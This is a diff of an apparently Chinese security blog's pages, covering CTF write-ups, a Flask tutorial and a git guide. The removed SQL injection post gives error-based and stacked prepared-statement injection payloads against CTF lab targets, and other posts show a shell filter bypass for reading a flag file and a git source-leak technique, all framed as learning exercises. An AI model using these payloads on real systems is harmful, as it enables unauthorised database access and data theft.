 <p>参考swpu的一道CTF题目–&gt;&gt; SimplePHP <a href="https://www.anquanke.com/post/id/168338" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168338</a></p>
 
+          
+        
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/12/25/php协议漏洞/" data-id="ck0l0oh9i0010py2ihpth57uc" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web漏洞/">web漏洞</a></li></ul>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
     </footer>
   </div>
   
-</article>
+  
+  
+  </article>
 
+
+    
+      
 
   
-    <article id="post-第九届swpuctf" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/12/21/第九届swpuctf/" class="article-date">
-  <time datetime="2018-12-20T16:00:00.000Z" itemprop="datePublished">2018-12-21</time>
-</a>
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/21/第九届swpuctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+      <header class="post-header">
+
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/21/第九届swpuctf/">swpu第九届线上ctf</a>
-    </h1>
-  
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/21/第九届swpuctf/" itemprop="url">swpu第九届线上ctf</a></h1>
+        
 
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-21T00:00:00+08:00">
+                2018-12-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
       </header>
     
-    <div class="article-entry" itemprop="articleBody">
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在历届swpuctf中题质量都是比较高的，此次有幸第一次参加swpuctf，题质量确实很高。期待明年的题目- -！！！</p>
+      
+
+      
+        
+          
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在历届swpuctf中题质量都是比较高的，此次有幸第一次参加swpuctf，题质量确实很高。期待明年的题目- -！！！</p>
 <p>总结三道本次比赛的web题目。</p>
 <h1 id="1-有趣的邮箱注册"><a href="#1-有趣的邮箱注册" class="headerlink" title="1.有趣的邮箱注册"></a>1.有趣的邮箱注册</h1><p>首先打开页面。很正常的一个标准页面。没啥信息。</p>
 <p><img src="https://i.imgur.com/cRAqWlV.png" alt></p>
@@ -1240,44 +2066,125 @@ echo &quot;\n&quot;;
 <p>当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 “n” 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。<br>也就是说 ^和$会匹配 字符串中n之前和之后，也会匹配整个字符串的开始和结尾，但是只要匹配到一个就会返回正确</p>
 <p>绕过选择 [c]at [f][l][a][g]。linux中会匹配[]中任意一个字符，或者 选择转义 ca\t f\lag</p>
 
+          
+        
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/12/21/第九届swpuctf/" data-id="ck0l0oh9z0026py2i43dnmx9i" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
     </footer>
   </div>
   
-</article>
+  
+  
+  </article>
 
+
+    
+      
 
   
-    <article id="post-flask从0到无" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/12/14/flask从0到无/" class="article-date">
-  <time datetime="2018-12-13T16:00:00.000Z" itemprop="datePublished">2018-12-14</time>
-</a>
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/14/flask从0到无/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+      <header class="post-header">
+
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/14/flask从0到无/">Flask从零到无</a>
-    </h1>
-  
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/14/flask从0到无/" itemprop="url">Flask从零到无</a></h1>
+        
 
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-14T00:00:00+08:00">
+                2018-12-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
       </header>
     
-    <div class="article-entry" itemprop="articleBody">
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <h1 id="零基础学起"><a href="#零基础学起" class="headerlink" title="零基础学起"></a>零基础学起</h1><p>学习flask我选择了 pycharm，学生的话可以免费下载专业版。废话不多说了。  </p>
+      
+
+      
+        
+          
+            <h1 id="零基础学起"><a href="#零基础学起" class="headerlink" title="零基础学起"></a>零基础学起</h1><p>学习flask我选择了 pycharm，学生的话可以免费下载专业版。废话不多说了。  </p>
 <p>环境：python 3.6+<br>基础：0-<br>日期：2018.12.14 </p>
 <h1 id="flask入门"><a href="#flask入门" class="headerlink" title="flask入门"></a>flask入门</h1><h2 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h2><p>pycharm安装flask会自动导入了flask所需的模块，所以我们只需要命令安装所需要的包就可以了，建议用python3.6学习而不是2.7，毕竟django都快要不支持2.7了，早换早超生。</p>
 <p>自动导入的也是python 3.6。<br><img src="https://i.imgur.com/VgalqNv.png" alt></p>
@@ -1396,44 +2303,125 @@ if __name__ == &apos;__main__&apos;:
     app.run()</code></pre><hr>
 <p>参考：<a href="http://www.pythondoc.com/flask-mega-tutorial/" target="_blank" rel="noopener">http://www.pythondoc.com/flask-mega-tutorial/</a></p>
 
+          
+        
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/12/14/flask从0到无/" data-id="ck0l0oh9d000opy2i4zoia8yv" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
     </footer>
   </div>
   
-</article>
+  
+  
+  </article>
 
+
+    
+      
 
   
-    <article id="post-南邮CTF-2018" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/12/06/南邮CTF-2018/" class="article-date">
-  <time datetime="2018-12-05T16:00:00.000Z" itemprop="datePublished">2018-12-06</time>
-</a>
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/06/南邮CTF-2018/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+      <header class="post-header">
+
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/06/南邮CTF-2018/">南邮CTF-2018</a>
-    </h1>
-  
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/06/南邮CTF-2018/" itemprop="url">南邮CTF-2018</a></h1>
+        
 
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-06T00:00:00+08:00">
+                2018-12-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
       </header>
     
-    <div class="article-entry" itemprop="articleBody">
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <h1 id="全球最大交友网站"><a href="#全球最大交友网站" class="headerlink" title="全球最大交友网站"></a>全球最大交友网站</h1><p>进入网站是一个时钟。<br><img src="https://i.imgur.com/0Pw6skq.png" alt><br>并没什么思路，只能拿工具扫一下了。.git禁止访问，可能存在git源码泄露。用lijiejie的工具，下载源码发现没啥乱用，一个readme.txt。本来没想点进去，发现确实有提示</p>
+      
+
+      
+        
+          
+            <h1 id="全球最大交友网站"><a href="#全球最大交友网站" class="headerlink" title="全球最大交友网站"></a>全球最大交友网站</h1><p>进入网站是一个时钟。<br><img src="https://i.imgur.com/0Pw6skq.png" alt><br>并没什么思路，只能拿工具扫一下了。.git禁止访问，可能存在git源码泄露。用lijiejie的工具，下载源码发现没啥乱用，一个readme.txt。本来没想点进去，发现确实有提示</p>
 <p>Allsource files areingit tag1.0</p>
 <p>这意思是所有的源码都在 tag1.0中，也就是不在这个版本中。也就是说这个版本他把仓库东西给删除了，你如果想要1.0版本必须要回溯到1.0版本。不过既然有.git按道理说都是可以看到的。一个工具给大家。</p>
 <pre><code>#!/bin/bash
@@ -1570,44 +2558,125 @@ while(1):
     $result=base64_encode($result);
     echo $result;</code></pre><p>value输入想读的文件输入flag.php 转换成Zm5lbTZ6dH4=<br>然后提交file_=Zm5lbTZ6dH4=就可读取flag.php<br>千万不要被骗了，哭了！<br><img src="https://i.imgur.com/L3m1MHA.png" alt></p>
 
+          
+        
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/12/06/南邮CTF-2018/" data-id="ck0l0oh9t001opy2ip9hh2iwj" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
     </footer>
   </div>
   
-</article>
+  
+  
+  </article>
 
+
+    
+      
 
   
-    <article id="post-git工具的使用" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/12/04/git工具的使用/" class="article-date">
-  <time datetime="2018-12-03T16:00:00.000Z" itemprop="datePublished">2018-12-04</time>
-</a>
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/04/git工具的使用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+      <header class="post-header">
+
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/04/git工具的使用/">git使用与部署github</a>
-    </h1>
-  
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/04/git工具的使用/" itemprop="url">git使用与部署github</a></h1>
+        
 
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-04T00:00:00+08:00">
+                2018-12-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
       </header>
     
-    <div class="article-entry" itemprop="articleBody">
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <h1 id="GIT是什么"><a href="#GIT是什么" class="headerlink" title="GIT是什么"></a>GIT是什么</h1><p>GIT是先进的分布式版本控制系统，既然是分布式控制系统，那么就是没有中央服务器的，每个终端都可以是一个完整的库，如果家庭单位两台电脑如何修改库呢，只需要推送给对方进行修改即可。既然是分布式，每台电脑就可以是一个库那么也就自然不需要连接服务器进行上传了，不过接下来我们要介绍到上传github上。</p>
+      
+
+      
+        
+          
+            <h1 id="GIT是什么"><a href="#GIT是什么" class="headerlink" title="GIT是什么"></a>GIT是什么</h1><p>GIT是先进的分布式版本控制系统，既然是分布式控制系统，那么就是没有中央服务器的，每个终端都可以是一个完整的库，如果家庭单位两台电脑如何修改库呢，只需要推送给对方进行修改即可。既然是分布式，每台电脑就可以是一个库那么也就自然不需要连接服务器进行上传了，不过接下来我们要介绍到上传github上。</p>
 <h1 id="git有什么好处"><a href="#git有什么好处" class="headerlink" title="git有什么好处"></a>git有什么好处</h1><p>git最大的好处就是方便，好吧，如何方便呢，他可以自由回退各个版本，就是你对一个库的任何修改他都会保存，如果你用不到那么可以不用知道他的存在，如果你需要，他可以调用出来你以前的版本。举个例子。</p>
 <p>一个版本库存放一个项目，并且已经推送到github上供人下载，此时你要更新到下一个版本，进行修改推送到网站上，但是你发现有一个大bug，但是时间太久记不清修改了哪里，毕竟那么多细节，此时就可以用git按照日期回退版本，在进行从新开发。对任意时间段的版本重置。并且你可以对每次改动增加一个备注，比如：</p>
 <pre><code>版本    文件名      操作人   说明             日期
@@ -1653,240 +2722,641 @@ git config –global user.email “邮箱”    </code></pre><p>配置完成输�
 <p>第一步：git   add  . //后面是一个英文的.<br>第二步：git   commit   –m   “1”   (如果提交单个文件1，就这样写；如果提交所有文件，写成：git   commit   –m  *)<br>第三步：git   push   <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:shuaizhupeiqi/test//这样就可以推送上去了。  </p>
 <p><img src="http://a3.qpic.cn/psb?/V14K5DCn0YAkcr/M4vqusCrfUGeaBBFkQiuKiX4mqnMNk.Enm*Cf0JupbE!/b/dD4BAAAAAAAA&ek=1&kp=1&pt=0&bo=VgUlAwAAAAADF0c!&tl=1&vuin=275640346&tm=1543924800&sce=60-2-2&rf=viewer_4" alt><br>这样就完成了。</p>
 
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/12/04/git工具的使用/" data-id="ck0l0oh9c000mpy2ihqw48yc8" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/杂/">杂</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-sql注入" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/12/03/sql注入/" class="article-date">
-  <time datetime="2018-12-02T16:00:00.000Z" itemprop="datePublished">2018-12-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+          
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/03/sql注入/">sql注入</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>注入千百样，本文仅记录一些姿势供个人查阅。轻喷。</p>
-<h1 id="HTTP分割注入"><a href="#HTTP分割注入" class="headerlink" title="HTTP分割注入"></a>HTTP分割注入</h1><p>题目地址实验吧：加了料的报错注入。<br>地址：<a href="http://ctf5.shiyanbar.com/web/baocuo/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/baocuo/index.php</a></p>
-<p><img src="http://m.qpic.cn/psb?/V14K5DCn0YAkcr/hM1RxRZ4qdSGafHA6s7uXUMdGnBa6U2Jb.rkqC2NQ8s!/b/dDYBAAAAAAAA&bo=GQPdAAAAAAADF*U!&rf=viewer_4" alt></p>
-<p>查看页面源代码，给出了我们sql查询语句很常规</p>
-<pre><code>&lt;!-- $sql=&quot;select * from users where username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;  --&gt;</code></pre><p>根据提示 post传一个username和password然后开始注入</p>
-<p>语句：</p>
-<pre><code>username=admin&apos; or &apos;&amp;password=admin</code></pre><p>显示 You are our member, welcome to enter，可以说明单引号空格没有被过滤，不过既然是报错注入，那么加个单引号试试。</p>
-<p>语句：</p>
-<pre><code>username=admin&apos;&amp;password=admin</code></pre><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘admin’’ at line 1</p>
-<p>接下来写报错语句<br>语句：</p>
-<pre><code>username=admin&apos;and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &apos;&amp;password=admin</code></pre><p>一翻测试之后发现,有个神奇的过滤，username过滤了（），password过滤了一切报错函数。</p>
-<p>可以组合一下。username写函数updatexml。password写（），但是怎么合并为一起呢，想到sql语句是  </p>
-<pre><code>select * from users where username=&apos;$username&apos; and password=&apos;$password  
-$username=updatexm/*,$password=*/...这样sql语句会变成
-
-select * from users where username=&apos;updatexm/* and password=&apos;*/...</code></pre><p>这样便可以注释掉中间的代码一种骚姿势，接下来继续正常注入。</p>
-<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select database()),0x7e),1) or &apos;</code></pre><p><img src="http://47.106.185.69/1/./img/1559184520.jpg" alt></p>
-<p>成功爆出来数据库名称。</p>
-<p>语句</p>
-<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select table_name from information_schema.tables where table_schema =&apos;error_based_hpf&apos;),0x7e),1) or &apos;</code></pre><p>=号被过滤，可以使用正则注入，也就是=换成regexp</p>
-<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp&apos;error_based_hpf&apos;),0x7e),1) or &apos;</code></pre><p>这里使用group_concat来爆出所有的表名字</p>
-<pre><code>XPATH syntax error: &apos;~ffll44jj,users~&apos;</code></pre><p>查列</p>
-<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name regexp&apos;ffll44jj&apos;),0x7e),1) or &apos;
-
-XPATH syntax error: &apos;~value~&apos;</code></pre><p>查数据</p>
-<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select value from 
-ffll44jj),0x7e),1) or &apos;
-
-XPATH syntax error: &apos;~flag{err0r_b4sed_sqli_+_hpf}~&apos;</code></pre><p>如果flag超过32位，可以mid截断来查询。不过本题中是禁止了mid函数的不过也不超过32位可以直接获取flag。</p>
-<h1 id="堆叠预编译注入"><a href="#堆叠预编译注入" class="headerlink" title="堆叠预编译注入"></a>堆叠预编译注入</h1><p>首先了解下预处理语句</p>
-<pre><code>预制语句的SQL语法基于三个SQL语句：
-
-PREPARE stmt_name FROM preparable_stmt;
-
-EXECUTE stmt_name [USING @var_name [, @var_name] ...];
-
-{DEALLOCATE | DROP} PREPARE stmt_name;</code></pre><p>对于不确定参数以问号代替，然后using加入参数即可。</p>
-<p><img src="http://47.106.185.69/1/./img/1559185099.jpg" alt></p>
-<p>预处理语句可以和正常查询一样，但是查询方式稍有变化，在一些绕过中可以利用这种机制来进行sql注入。</p>
-<p>堆叠注入</p>
-<p>在一条sql语句执行完毕后，使用分号结尾，然后利用多条语句执行特性，然后完整攻击。</p>
-<p>简单的堆叠查询。</p>
-<p><img src="http://47.106.185.69/1/./img/1559186303.jpg" alt></p>
-<pre><code>mysql&gt; set @a=&apos;select * from user where id =1&apos;;prepare stmt from @a;execute stmt;
-Query OK, 0 rows affected (0.00 sec)
-
-Query OK, 0 rows affected (0.00 sec)
-Statement prepared
-
-+----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+
-| ID | username         | email            | password                         | img                                                                             |
-+----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+
-|  1 | 275640346@qq.com | 275640346@qq.com | 20905fe3160505df06abf12bfc8294fa | ../upload/54223df3e0247c41ce29176d227f95cf/ae566253288191ce5d879e51dae1d8c3.png |
-+----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+
-1 row in set (0.00 sec)</code></pre><p>利用mysql的特性对十六进制也可进行查询。</p>
-<p><img src="http://47.106.185.69/1/./img/1559186526.jpg" alt></p>
-<p>如果对prepare excute等关键词无过滤便可以用这个特性绕过很多关键词来达到sql注入效果。</p>
-<p>或者ascii来解码进行注入</p>
-<p>mysql&gt; set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41)); prepare a from @s;execute a;<br>Query OK, 0 rows affected (0.00 sec)</p>
-<p>Query OK, 0 rows affected (0.00 sec)<br>Statement prepared</p>
-<pre><code>+------------+
-| database() |
-+------------+
-| qwb        |
-+------------+
-1 row in set (0.00 sec)
-
-mysql&gt; select concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41));
-+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
-| concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41)) |
-+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
-| select database()                                                                                                                                                         |
-+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</code></pre><p>1 row in set (0.00 sec)</p>
-<p>参考强网杯web-随便注</p>
-<pre><code>https://k-ring.github.io/2019/05/28/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwriteup/</code></pre>
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/12/03/sql注入/" data-id="ck0l0oh9k0014py2iafig5o5b" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
     </footer>
   </div>
   
-</article>
+  
+  
+  </article>
 
+
+    
+  </section>
 
   
-
-
-  <nav id="page-nav">
-    
-    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
-</section>
-        
-          <aside id="sidebar">
-  
-    
 
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
   
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
     </div>
   </div>
 
-
-  
+  <aside id="sidebar" class="sidebar">
     
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.ico" alt="小猪佩奇">
+            
+              <p class="site-author-name" itemprop="name">小猪佩奇</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
     </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
-    </div>
-  </div>
+  </aside>
 
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
-          </li>
-        
-          <li>
-            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
-          </li>
-        
-          <li>
-            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
-          </li>
-        
-          <li>
-            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
-          </li>
-        
-          <li>
-            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
         
       </div>
-      <footer id="footer">
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">小猪佩奇</span>
+
   
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2019 John Doe<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
+</div>
+
+
+
+<div class="powered-by">
